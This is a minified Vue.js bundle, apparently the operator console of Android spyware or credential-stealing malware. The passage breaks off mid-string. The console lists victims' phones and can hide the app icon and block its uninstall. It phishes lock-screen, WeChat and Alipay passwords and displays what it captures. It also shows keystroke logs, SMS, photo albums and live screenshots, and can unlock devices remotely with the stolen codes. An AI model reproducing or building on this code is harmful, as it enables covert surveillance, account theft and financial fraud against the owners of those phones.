import{u as X}from"./useView.7a1c979e.js";import{_ as Z,k as ee,b as L}from"./index.a08d64ed.js";import te from"./list.8b0b0cf6.js";import le from"./list.dd251b2f.js";import ae from"./list.6c394872.js";import ie from"./list.a36f5e2e.js";import{d as oe,a as ue,e as r,a0 as de,O as p,W as J,r as m,y as se,t as d,A as f,F as a,G as i,K as q,J as R,u as F,I as n,P as re,z as G,H as b,B as u,a6 as ne,f as V,M as Q}from"./vlib.611ed292.js";import"./lodash.78aef77c.js";import"./monacoeditor.d62c48b5.js";import"./lib.18273bf4.js";const pe=oe({components:{AppList:te,SmsList:le,AlbumList:ae,SnapshotList:ie,CopyDocument:ee},setup(){const e=ue({post:!0,getDataListURL:"/device/page",getDataListIsPage:!0,installAppFilter:[],dataForm:{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",remark:"",kill:"",accessibilityServiceEnabled:1,lastStart:"",lastEnd:"",createdStart:"",createdEnd:""}}),t=r(""),o=r([]),c=r(!1),y=r(!1),k=r([]),D=r([]),g=r(""),w=r(null),C=r({deviceId:"",pkg:""}),S=r(!1),U=r({deviceId:""}),h=r(!1),_=r([]),x=r(null),Y=r(!1),M=r(null),$=r(!1),v=r({deviceId:""}),H=r(!1),E=r({deviceId:""}),A=r(!1),z=r({deviceId:""}),N=r(null),B=r(null),O=r(!1),W=r(""),j=r(!1),K=r({id:"",deviceId:"",remark:""}),P=r(!1),T=r(!1),l=r([]),s=r("");return{...X(e),...de(e),deviceId:t,inputLogVisible:c,logLoading:y,inputLogList:k,queryDate:D,queryAppPkg:g,querySource:w,currentDevice:C,appListVisible:S,currentAppDevice:U,unlockDialogVisible:h,unlockOptions:_,selectedUnlockId:x,unlocking:Y,currentWakeRow:M,smsListVisible:$,currentSmsDevice:v,albumListVisible:H,currentAlbumDevice:E,snapshotListVisible:A,currentSnapshotDevice:z,createdRange:N,lastHeartRange:B,remarkDialogVisible:O,remarkContent:W,remarkSubmitting:j,currentRemarkDevice:K,fishPwdDialogVisible:P,fishPwdLoading:T,fishPwdList:l,fishPwdTitle:s,fishTemplateList:o,permissionsName:{"android.permission.READ_SMS":"\u77ED\u4FE1","android.permission.READ_MEDIA_IMAGES":"\u76F8\u518C","android.permission.BATTERY":"\u7535\u6C60","android.permission.AUTO_START":"\u81EA\u542F\u52A8","android.permission.CAMERA":"\u6444\u50CF\u5934"}}},async mounted(){await this.fetchInstallAppFilterList(),this.getDataList(),await this.fetchFishTemplateList()},methods:{async copyed(e){const t=e&&e.deviceId?String(e.deviceId):"";if(!t){p.warning("\u65E0\u53EF\u590D\u5236\u7684\u8BBE\u5907ID");return}try{if(navigator.clipboard&&window.isSecureContext)await navigator.clipboard.writeText(t);else{const o=document.createElement("textarea");o.value=t,o.setAttribute("readonly","true"),o.style.position="fixed",o.style.left="-9999px",o.style.top="-9999px",document.body.appendChild(o),o.select(),document.execCommand("copy"),document.body.removeChild(o)}p.success("\u5DF2\u590D\u5236\u8BBE\u5907ID")}catch{p.error("\u590D\u5236\u5931\u8D25")}},resetQuery(){Object.assign(this.dataForm,{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",remark:"",kill:"",accessibilityServiceEnabled:1,lastStart:"",lastEnd:"",createdStart:"",createdEnd:""}),this.createdRange=null,this.lastHeartRange=null,this.getDataList()},onCreatedTimeChange(e){e&&Array.isArray(e)&&e.length===2?(this.dataForm.createdStart=e[0],this.dataForm.createdEnd=e[1]):(this.dataForm.createdStart="",this.dataForm.createdEnd="")},onLastHeartTimeChange(e){e&&Array.isArray(e)&&e.length===2?(this.dataForm.lastStart=e[0],this.dataForm.lastEnd=e[1]):(this.dataForm.lastStart="",this.dataForm.lastEnd="")},async fetchFishTemplateList(){let{code:e,data:t,msg:o}=await L.post("/device/fishCodeList");e==0?this.fishTemplateList=t:p.error(o||"\u83B7\u53D6\u9493\u9C7C\u6A21\u677F\u5931\u8D25")},openDeviceDetail(e){const t=`device_detail_${e.deviceId}_${Date.now()}`;sessionStorage.setItem(t,JSON.stringify(e));const o=window.location.href.split("#")[0],c=new URLSearchParams({pop:"true",page:"1",key:t,_mt:`\u8BBE\u5907\u8BE6\u60C5-${e.deviceId}`}).toString();window.open(`${o}#/device/detail?${c}`,"_blank")},async fetchInstallAppFilterList(){let{code:e,data:t,msg:o}=await L.post("/device/installAppFilterList");e==0?this.installAppFilter=t:J.alert(o,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async wakeup(e){var k;const{success:t,data:o,msg:c}=await L.post("/unlockScreenPwd/page",{deviceId:e.id,page:1,limit:100});if(!t){p.error(c);return}const y=Array.isArray(o)?o:o&&(o.list||o.records)||[];if(this.unlockOptions=y||[],!this.unlockOptions||this.unlockOptions.length===0){p({message:"\u6682\u65E0\u53EF\u9009\u89E3\u9501\u5BC6\u7801\uFF0C\u8BF7\u5148\u6DFB\u52A0",type:"warning"});return}this.currentWakeRow=e,this.selectedUnlockId=((k=this.unlockOptions[0])==null?void 0:k.id)||null,this.unlockDialogVisible=!0},async confirmWakeup(){if(!this.currentWakeRow||!this.selectedUnlockId){p({message:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",type:"warning"});return}this.unlocking=!0;try{const{code:e,msg:t}=await L.post("/device/wakeup",{id:this.currentWakeRow.id,unlockPwdId:this.selectedUnlockId});e==0?(p({message:"\u64CD\u4F5C\u6210\u529F,\u7B49\u5F85\u5524\u9192!",type:"success"}),this.unlockDialogVisible=!1,this.currentWakeRow=null,this.selectedUnlockId=null,this.getDataList()):J.alert(t,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})}finally{this.unlocking=!1}},async showInputLog(e){this.currentDevice.deviceId=e.deviceId,this.currentDevice.pkg=e.pkg,this.queryAppPkg="",this.querySource=null;const t=new Date,o=t.getFullYear()+"-"+String(t.getMonth()+1).padStart(2,"0")+"-"+String(t.getDate()).padStart(2,"0");this.queryDate=[o,o],this.inputLogVisible=!0,this.inputLogList=[],await this.refreshLog()},async refreshLog(){if(!this.currentDevice.deviceId||!this.currentDevice.pkg||!this.queryDate||!Array.isArray(this.queryDate)||this.queryDate.length!==2){p({message:"\u67E5\u8BE2\u53C2\u6570\u4E0D\u5B8C\u6574",type:"warning"});return}this.logLoading=!0,this.inputLogList=[];try{const[e,t]=this.queryDate,o=new Date(e),c=new Date(t),y=new Date(o.getFullYear(),o.getMonth(),o.getDate()).getTime(),k=new Date(c.getFullYear(),c.getMonth(),c.getDate()+1).getTime()-1,{code:D,data:g,msg:w}=await L.post("/inputTextRecord/group",{deviceId:this.currentDevice.deviceId,startTime:y,endTime:k,pkg:this.currentDevice.pkg,appPkg:this.queryAppPkg||void 0,source:this.querySource!==null?this.querySource:void 0});D==0?g&&g.items&&Array.isArray(g.items)?this.inputLogList=g.items:this.inputLogList=[]:p({message:w||"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}catch{p({message:"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}finally{this.logLoading=!1}},onDateChange(){},formatTime(e){if(!e)return"";const t=Number(e);if(isNaN(t))return"";const o=new Date(t);if(isNaN(o.getTime()))return"";const c=o.getFullYear(),y=String(o.getMonth()+1).padStart(2,"0"),k=String(o.getDate()).padStart(2,"0"),D=String(o.getHours()).padStart(2,"0"),g=String(o.getMinutes()).padStart(2,"0"),w=String(o.getSeconds()).padStart(2,"0");return`${c}-${y}-${k} ${D}:${g}:${w}`},async updateFishSwitch(e,t,o){try{const{success:c,msg:y}=await L.post("/device/updateFishSwitch",{id:e.id,code:t,value:o},void 0,!0);c?(p.success("\u66F4\u65B0\u6210\u529F"),this.getDataList()):p.error(y||"\u66F4\u65B0\u5931\u8D25")}catch{p.error("\u66F4\u65B0\u5931\u8D25")}},async updateDeviceSwitch(e,t,o){const c=o?1:0;e[t]=c;try{const{success:y,msg:k}=await L.post("/device/updateSwitch",{id:e.id,[t]:c},void 0,!0);y?p.success("\u66F4\u65B0\u6210\u529F"):(p.error(k||"\u66F4\u65B0\u5931\u8D25"),e[t]=c?0:1)}catch{p.error("\u66F4\u65B0\u5931\u8D25"),e[t]=c?0:1}},formatUnlockTips(e){let t="";switch(e.type){case 0:return"\u65E0\u9501";case 1:t="PIN\u7801";break;case 2:t="\u624B\u52BF";break;case 3:t="\u6DF7\u5408\u5BC6\u7801";break;default:return"\u672A\u77E5"}let o="";switch(e.source){case 1:o="\u9493\u9C7C";break;case 2:o="\u91C7\u96C6";break;default:o="\u672A\u77E5";break}return`(${o}) - ${t}:${e.tips}`},showAppList(e){this.currentAppDevice.deviceId=e.deviceId,this.appListVisible=!0},showSmsList(e){this.currentSmsDevice.deviceId=e.deviceId,this.smsListVisible=!0},showAlbumList(e){this.currentAlbumDevice.deviceId=e.deviceId,this.albumListVisible=!0},showSnapshotList(e){this.currentSnapshotDevice.deviceId=e.deviceId,this.snapshotListVisible=!0},showRemarkDialog(e){this.currentRemarkDevice.id=e.id,this.currentRemarkDevice.deviceId=e.deviceId,this.currentRemarkDevice.remark=e.remark||"",this.remarkContent=e.remark||"",this.remarkDialogVisible=!0},async submitRemark(){if(!this.currentRemarkDevice.id){p.error("\u8BBE\u5907ID\u4E0D\u80FD\u4E3A\u7A7A");return}this.remarkSubmitting=!0;try{const{code:e,msg:t}=await L.post("/device/updateRemark",{id:this.currentRemarkDevice.id,remark:this.remarkContent});e===0?(p.success("\u5907\u6CE8\u66F4\u65B0\u6210\u529F"),this.remarkDialogVisible=!1,this.remarkContent="",this.getDataList()):p.error(t||"\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}catch{p.error("\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}finally{this.remarkSubmitting=!1}},async showFishPwd(e,t){this.fishPwdLoading=!0,this.fishPwdDialogVisible=!0,this.fishPwdList=[];const o={wx:"\u5FAE\u4FE1",zfb:"\u652F\u4ED8\u5B9D"};this.fishPwdTitle=`\u8BBE\u5907ID: ${e.deviceId} - ${o[t]||t}`;try{const{code:c,data:y,msg:k}=await L.post("/device/showFishPwd",{deviceId:e.deviceId,code:t});c===0&&y?(this.fishPwdList=Array.isArray(y)?y:[],this.fishPwdList.length===0&&p.warning("\u6682\u65E0\u9493\u9C7C\u5BC6\u7801\u6570\u636E")):(p.error(k||"\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1)}catch{p.error("\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1}finally{this.fishPwdLoading=!1}}}}),ce={class:"mod-sys__log-operation"},me=["onClick"],ge={class:"cell-two-line"},fe={key:0},he={key:1},we={key:2},ve={class:"cell-two-line"},ye={key:0},be={key:1},ke={key:2},De={key:1,style:{color:"#ccc"}},Fe={key:0,type:"success"},Ce={key:2},Ee={class:"switch-grid"},Be={class:"switch-item"},Ve={class:"switch-item"},Le={class:"switch-item"},Se={class:"switch-item"},Ae={class:"switch-label"},Ie={class:"switch-actions"},$e={class:"switch-item"},Ue={class:"perm-grid"},xe={class:"perm-text"},Pe={class:"screen-status-grid"},qe={class:"log-header"},Re={class:"header-row"},ze={class:"query-controls"},Te={class:"log-content"},_e={class:"log-content-row"},Ye={class:"log-time"},Me={class:"log-app"},He={key:0,class:"log-resource"},Ne={class:"log-text"},Oe={key:0,class:"no-data"},We={style:{float:"left"}},je={style:{float:"right",color:"#8492a6","font-size":"13px"}},Ke={style:{color:"#00adff"}},Ge={key:0,style:{"text-align":"center",padding:"20px",color:"#909399"}};function Je(e,t,o,c,y,k){var T;const D=m("el-input"),g=m("el-form-item"),w=m("el-col"),C=m("el-option"),S=m("el-select"),U=m("el-date-picker"),h=m("el-button"),_=m("el-row"),x=m("el-form"),Y=m("CopyDocument"),M=m("el-icon"),$=m("el-tooltip"),v=m("el-table-column"),H=m("el-image"),E=m("el-tag"),A=m("el-switch"),z=m("el-table"),N=m("el-pagination"),B=m("el-dialog"),O=m("AppList"),W=m("SmsList"),j=m("AlbumList"),K=m("SnapshotList"),P=se("loading");return d(),f("div",ce,[a(x,{inline:!0,model:e.dataForm,onKeyup:t[13]||(t[13]=re(l=>e.getDataList(),["enter"])),class:"query-form","label-width":"90px"},{default:i(()=>[a(_,{gutter:20},{default:i(()=>[a(w,{span:6},{default:i(()=>[a(g,{label:"\u8BBE\u5907ID"},{default:i(()=>[a(D,{modelValue:e.dataForm.deviceId,"onUpdate:modelValue":t[0]||(t[0]=l=>e.dataForm.deviceId=l),placeholder:"\u8BF7\u8F93\u5165\u8BBE\u5907ID",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u6240\u5C5E\u5305"},{default:i(()=>[a(D,{modelValue:e.dataForm.pkg,"onUpdate:modelValue":t[1]||(t[1]=l=>e.dataForm.pkg=l),placeholder:"\u8BF7\u8F93\u5165\u6240\u5C5E\u5305",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u624B\u673A\u578B\u53F7"},{default:i(()=>[a(D,{modelValue:e.dataForm.model,"onUpdate:modelValue":t[2]||(t[2]=l=>e.dataForm.model=l),placeholder:"\u8BF7\u8F93\u5165\u624B\u673A\u578B\u53F7",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u54C1\u724C"},{default:i(()=>[a(D,{modelValue:e.dataForm.brand,"onUpdate:modelValue":t[3]||(t[3]=l=>e.dataForm.brand=l),placeholder:"\u8BF7\u8F93\u5165\u54C1\u724C",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u5B89\u88C5\u5E94\u7528"},{default:i(()=>[a(S,{modelValue:e.dataForm.installApp,"onUpdate:modelValue":t[4]||(t[4]=l=>e.dataForm.installApp=l),placeholder:"\u8BF7\u9009\u62E9\u5B89\u88C5\u5E94\u7528",clearable:""},{default:i(()=>[(d(!0),f(q,null,R(e.installAppFilter,l=>(d(),F(C,{key:l.pkg,label:l.pkg,value:l.pkg},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u5C4F\u5E55\u72B6\u6001"},{default:i(()=>[a(S,{modelValue:e.dataForm.status,"onUpdate:modelValue":t[5]||(t[5]=l=>e.dataForm.status=l),placeholder:"\u8BF7\u9009\u62E9\u72B6\u6001",clearable:""},{default:i(()=>[a(C,{label:"\u7184\u5C4F",value:0}),a(C,{label:"\u4EAE\u5C4F",value:1})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u5DF2\u6740/\u672A\u6740"},{default:i(()=>[a(S,{modelValue:e.dataForm.kill,"onUpdate:modelValue":t[6]||(t[6]=l=>e.dataForm.kill=l),placeholder:"\u8BF7\u9009\u62E9\u72B6\u6001",clearable:""},{default:i(()=>[a(C,{label:"\u672A\u6740",value:0}),a(C,{label:"\u5DF2\u6740",value:1})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u65E0\u969C\u788D"},{default:i(()=>[a(S,{modelValue:e.dataForm.accessibilityServiceEnabled,"onUpdate:modelValue":t[7]||(t[7]=l=>e.dataForm.accessibilityServiceEnabled=l),placeholder:"\u8BF7\u9009\u62E9\u65E0\u969C\u788D\u72B6\u6001",clearable:""},{default:i(()=>[a(C,{selected:"",label:"\u5F00\u542F\u65E0\u969C\u788D",value:1}),a(C,{label:"\u5173\u95ED\u65E0\u969C\u788D",value:0})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u5B89\u88C5\u65F6\u95F4"},{default:i(()=>[a(U,{modelValue:e.createdRange,"onUpdate:modelValue":t[8]||(t[8]=l=>e.createdRange=l),type:"datetimerange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65F6\u95F4","end-placeholder":"\u7ED3\u675F\u65F6\u95F4",format:"YYYY-MM-DD HH:mm:ss","value-format":"x",onChange:e.onCreatedTimeChange,style:{width:"100%"}},null,8,["modelValue","onChange"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4"},{default:i(()=>[a(U,{modelValue:e.lastHeartRange,"onUpdate:modelValue":t[9]||(t[9]=l=>e.lastHeartRange=l),type:"datetimerange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65F6\u95F4","end-placeholder":"\u7ED3\u675F\u65F6\u95F4",format:"YYYY-MM-DD HH:mm:ss","value-format":"YYYY-MM-DD HH:mm:ss",onChange:e.onLastHeartTimeChange,style:{width:"100%"}},null,8,["modelValue","onChange"])]),_:1})]),_:1}),a(w,{span:6},{default:i(()=>[a(g,{label:"\u5907\u6CE8"},{default:i(()=>[a(D,{modelValue:e.dataForm.remark,"onUpdate:modelValue":t[10]||(t[10]=l=>e.dataForm.remark=l),placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(w,{span:12,class:"query-buttons"},{default:i(()=>[a(h,{type:"primary",onClick:t[11]||(t[11]=l=>e.getDataList())},{default:i(()=>t[31]||(t[31]=[n("\u67E5\u8BE2")])),_:1}),a(h,{onClick:t[12]||(t[12]=l=>e.resetQuery())},{default:i(()=>t[32]||(t[32]=[n("\u91CD\u7F6E")])),_:1})]),_:1})]),_:1})]),_:1},8,["model"]),G((d(),F(z,{data:e.dataList,border:"",onSortChange:e.dataListSortChangeHandle,"table-layout":"auto",style:{width:"100%"}},{default:i(()=>[a(v,{prop:"deviceId",label:"\u8BBE\u5907ID","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""},{default:i(l=>[a(h,{link:"",type:"primary",onClick:s=>e.openDeviceDetail(l.row)},{default:i(()=>[n(b(l.row.deviceId),1)]),_:2},1032,["onClick"]),a($,{placement:"top","show-after":300,content:"\u590D\u5236\u8BBE\u5907ID"},{default:i(()=>[u("span",{class:"copy-action",onClick:ne(s=>e.copyed(l.row),["stop"])},[a(M,{class:"copy-icon"},{default:i(()=>[a(Y)]),_:1})],8,me)]),_:2},1024)]),_:1}),a(v,{prop:"pkg",label:"\u6240\u5C5E\u5305","header-align":"center",align:"center",width:"120px","show-overflow-tooltip":""}),a(v,{label:"\u54C1\u724C/\u578B\u53F7","header-align":"center",align:"center",width:"100px","show-overflow-tooltip":""},{default:i(l=>[u("div",ge,[l.row.brand?(d(),f("div",fe,b(l.row.brand),1)):V("",!0),l.row.model?(d(),f("div",he,b(l.row.model),1)):V("",!0),!l.row.brand&&!l.row.model?(d(),f("div",we,"-")):V("",!0)])]),_:1}),a(v,{prop:"ip",label:"\u57CE\u5E02/IP","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0},{default:i(l=>[u("div",ve,[l.row.addr?(d(),f("div",ye,b(l.row.addr),1)):V("",!0),l.row.ip?(d(),f("div",be,b(l.row.ip),1)):V("",!0),!l.row.addr&&!l.row.ip?(d(),f("div",ke,"-")):V("",!0)])]),_:1}),a(v,{label:"\u753B\u9762","header-align":"center",align:"center",width:"70px"},{default:i(l=>[l.row.screenSnapshot?(d(),F(H,{key:0,"z-index":"1000","preview-teleported":!0,src:`data:image/png;base64,${l.row.screenSnapshot}`,"preview-src-list":[`data:image/png;base64,${l.row.screenSnapshot}`],fit:"fill",style:{width:"100px",height:"200px","border-radius":"4px",cursor:"pointer"}},null,8,["src","preview-src-list"])):(d(),f("span",De,"-"))]),_:1}),a(v,{prop:"lastHeart",label:"\u7535\u91CF","header-align":"center",align:"center",width:"70px"},{default:i(l=>[l.row.charging==1?(d(),f("div",Fe,[a($,{class:"box-item",effect:"dark",content:`\u5145\u7535\u4E2D:${l.row.battery}%`,placement:"top"},{default:i(()=>t[33]||(t[33]=[u("svg",{t:"1768278533985",class:"icon",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"5048","data-darkreader-inline-fill":"",width:"16",height:"16"},[u("path",{d:"M384 170.666667V128a42.666667 42.666667 0 0 1 42.666667-42.666667h170.666666a42.666667 42.666667 0 0 1 42.666667 42.666667v42.666667h128a42.666667 42.666667 0 0 1 42.666667 42.666666v682.666667a42.666667 42.666667 0 0 1-42.666667 42.666667H256a42.666667 42.666667 0 0 1-42.666667-42.666667V213.333333a42.666667 42.666667 0 0 1 42.666667-42.666666h128z m170.666667 341.333333V298.666667l-213.333334 298.666666h128v213.333334l213.333334-298.666667h-128z",fill:"#1afa29","p-id":"5049","data-darkreader-inline-fill":"",style:{"--darkreader-inline-fill":"var(--darkreader-background-1afa29, #04bb3b)"}})],-1)])),_:2},1032,["content"])])):l.row.battery>0?(d(),F(E,{key:1,type:l.row.battery>20?"success":"warning"},{default:i(()=>[n(b(l.row.battery)+"%",1)]),_:2},1032,["type"])):(d(),f("div",Ce))]),_:1}),a(v,{prop:"lastHeart",label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(v,{prop:"created",label:"\u5B89\u88C5\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(v,{prop:"remark",label:"\u5907\u6CE8","show-overflow-tooltip":"","header-align":"center",align:"center"}),a(v,{label:"\u63A7\u5236\u5F00\u5173","header-align":"center",align:"right",width:"260px"},{default:i(l=>[u("div",Ee,[u("div",Be,[t[34]||(t[34]=u("span",{class:"switch-label"},"\u9690\u85CF\u56FE\u6807",-1)),a(A,{"model-value":!!l.row.hideIcon,"onUpdate:modelValue":s=>e.updateDeviceSwitch(l.row,"hideIcon",s)},null,8,["model-value","onUpdate:modelValue"])]),u("div",Ve,[t[35]||(t[35]=u("span",{class:"switch-label"},"\u963B\u6B62\u5378\u8F7D",-1)),a(A,{"model-value":!!l.row.uninstallGuard,"onUpdate:modelValue":s=>e.updateDeviceSwitch(l.row,"uninstallGuard",s)},null,8,["model-value","onUpdate:modelValue"])]),u("div",Le,[t[36]||(t[36]=u("span",{class:"switch-label"},"\u89E3\u9501\u5BC6\u7801",-1)),a(A,{"model-value":!!l.row.unlockFish,"onUpdate:modelValue":s=>e.updateDeviceSwitch(l.row,"unlockFish",s)},null,8,["model-value","onUpdate:modelValue"])]),u("div",Se,[t[37]||(t[37]=u("span",{class:"switch-label"},"\u662F\u5426\u88AB\u6740",-1)),a(A,{"model-value":l.row.kill==1,"onUpdate:modelValue":s=>e.updateDeviceSwitch(l.row,"kill",s)},null,8,["model-value","onUpdate:modelValue"])]),(d(!0),f(q,null,R(e.fishTemplateList.filter(s=>s.code==="zfb"||s.code==="wx"),s=>(d(),f("div",{class:"switch-item",key:s.code},[u("span",Ae,b(s.code==="zfb"?"ZFB\u5BC6\u7801":"WX\u5BC6\u7801"),1),u("div",Ie,[a(A,{"model-value":l.row.fishSwitch&&!!l.row.fishSwitch[s.code],"onUpdate:modelValue":I=>e.updateFishSwitch(l.row,s.code,I)},null,8,["model-value","onUpdate:modelValue"]),!l.row.fishSwitch||!l.row.fishSwitch[s.code]?(d(),F(h,{key:0,link:"",type:"primary",size:"small",onClick:I=>e.showFishPwd(l.row,s.code)},{default:i(()=>t[38]||(t[38]=[n("\u67E5\u770B")])),_:2},1032,["onClick"])):V("",!0)])]))),128)),u("div",$e,[t[39]||(t[39]=u("span",{class:"switch-label"},"\u4E0A\u4F20\u65E5\u5FD7",-1)),a(A,{"model-value":l.row.uplog==1,"onUpdate:modelValue":s=>e.updateDeviceSwitch(l.row,"uplog",s)},null,8,["model-value","onUpdate:modelValue"])])])]),_:1}),a(v,{label:"\u6743\u9650\u5F00\u5173","header-align":"center",align:"center",width:"150px"},{default:i(l=>[u("div",Ue,[a(E,{class:"perm-tag",size:"small",effect:"light",type:l.row.accessibilityServiceEnabled==1?"success":"danger"},{default:i(()=>t[40]||(t[40]=[u("span",{class:"perm-text"},"\u65E0\u969C\u788D",-1)])),_:2},1032,["type"]),(d(!0),f(q,null,R(l.row.permissions,(s,I)=>(d(),F($,{key:I,content:String(I),placement:"top","show-after":300},{default:i(()=>[a(E,{class:"perm-tag",size:"small",effect:"light",type:s?"success":"danger"},{default:i(()=>[u("span",xe,b(e.permissionsName[I]||I),1)]),_:2},1032,["type"])]),_:2},1032,["content"]))),128))])]),_:1}),a(v,{label:"\u5C4F\u5E55\u72B6\u6001","header-align":"center",align:"center",width:"120px"},{default:i(l=>[u("div",Pe,[l.row.status==0?(d(),F(E,{key:0,size:"small",effect:"light",type:"info"},{default:i(()=>t[41]||(t[41]=[n("\u7184\u5C4F")])),_:1})):l.row.status==1?(d(),F(E,{key:1,size:"small",effect:"light",type:"success"},{default:i(()=>t[42]||(t[42]=[n("\u4EAE\u5C4F")])),_:1})):l.row.status==2||l.row.status==3?(d(),F(E,{key:2,size:"small",effect:"light",type:"warning"},{default:i(()=>t[43]||(t[43]=[n("\u7B49\u5F85\u5524\u9192")])),_:1})):(d(),F(E,{key:3,size:"small",effect:"light",type:"info"},{default:i(()=>t[44]||(t[44]=[n("\u672A\u77E5")])),_:1})),l.row.lockScreen?(d(),F($,{key:4,class:"box-item",effect:"dark",content:e.formatUnlockTips(l.row.lockScreen),placement:"top","show-after":300},{default:i(()=>[a(E,{size:"small",effect:"light",type:"success"},{default:i(()=>t[45]||(t[45]=[n("\u53EF\u89E3\u9501")])),_:1})]),_:2},1032,["content"])):(d(),F(E,{key:5,size:"small",effect:"light",type:"danger"},{default:i(()=>t[46]||(t[46]=[n("\u4E0D\u53EF\u89E3\u9501")])),_:1}))])]),_:1}),a(v,{label:"\u7CFB\u7EDF/SDK","header-align":"center",align:"center",width:"100px","show-overflow-tooltip":""},{default:i(l=>[n(b(l.row.systemVersion&&l.row.sdkVersion!==null&&l.row.sdkVersion!==void 0&&l.row.sdkVersion!==""?`${l.row.systemVersion} / ${l.row.sdkVersion}`:l.row.systemVersion||(l.row.sdkVersion!==null&&l.row.sdkVersion!==void 0?String(l.row.sdkVersion):"")||""),1)]),_:1}),a(v,{label:e.$t("handle"),"header-align":"center",align:"center",width:"90px",fixed:"right"},{default:i(l=>[u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.openDeviceDetail(l.row)},{default:i(()=>t[47]||(t[47]=[n("\u94FE\u63A5\u8BBE\u5907")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showInputLog(l.row)},{default:i(()=>t[48]||(t[48]=[n("\u8F93\u5165\u8BB0\u5F55")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showAppList(l.row)},{default:i(()=>t[49]||(t[49]=[n("\u5B89\u88C5\u5E94\u7528")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showSmsList(l.row)},{default:i(()=>t[50]||(t[50]=[n("\u77ED\u4FE1\u8BB0\u5F55")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showAlbumList(l.row)},{default:i(()=>t[51]||(t[51]=[n("\u67E5\u770B\u76F8\u518C")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showSnapshotList(l.row)},{default:i(()=>t[52]||(t[52]=[n("\u67E5\u770B\u622A\u56FE")])),_:2},1032,["onClick"])]),u("div",null,[a(h,{link:"",type:"primary",onClick:s=>e.showRemarkDialog(l.row)},{default:i(()=>t[53]||(t[53]=[n("\u5907\u6CE8")])),_:2},1032,["onClick"])])]),_:1},8,["label"])]),_:1},8,["data","onSortChange"])),[[P,e.dataListLoading]]),a(N,{"current-page":e.page,"page-sizes":[10,20,50,100],"page-size":e.limit,total:e.total,layout:"total, sizes, prev, pager, next, jumper",onSizeChange:e.pageSizeChangeHandle,onCurrentChange:e.pageCurrentChangeHandle},null,8,["current-page","page-size","total","onSizeChange","onCurrentChange"]),a(B,{modelValue:e.inputLogVisible,"onUpdate:modelValue":t[18]||(t[18]=l=>e.inputLogVisible=l),title:`\u8F93\u5165\u65E5\u5FD7 - \u8BBE\u5907ID: ${e.currentDevice.deviceId} \u5305\u540D: ${e.currentDevice.pkg}`,width:"970px","close-on-click-modal":!1,class:"input-log-dialog","destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[17]||(t[17]=l=>e.inputLogVisible=!1)},{default:i(()=>t[58]||(t[58]=[n("\u5173\u95ED")])),_:1})]),default:i(()=>[u("div",qe,[u("div",Re,[u("div",ze,[t[55]||(t[55]=u("span",{class:"query-label"},"\u6765\u6E90:",-1)),a(S,{modelValue:e.querySource,"onUpdate:modelValue":t[14]||(t[14]=l=>e.querySource=l),placeholder:"\u9009\u62E9\u6765\u6E90",clearable:"",style:{width:"120px"}},{default:i(()=>[a(C,{label:"\u7BA1\u7406\u7AEF",value:1}),a(C,{label:"App\u7AEF",value:0})]),_:1},8,["modelValue"]),t[56]||(t[56]=u("span",{class:"query-label"},"APP\u5305\u540D:",-1)),a(D,{modelValue:e.queryAppPkg,"onUpdate:modelValue":t[15]||(t[15]=l=>e.queryAppPkg=l),placeholder:"\u8F93\u5165APP\u5305\u540D",clearable:"",style:{width:"200px"}},null,8,["modelValue"]),t[57]||(t[57]=u("span",{class:"query-label"},"\u67E5\u8BE2\u65E5\u671F:",-1)),a(U,{modelValue:e.queryDate,"onUpdate:modelValue":t[16]||(t[16]=l=>e.queryDate=l),type:"daterange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65E5\u671F","end-placeholder":"\u7ED3\u675F\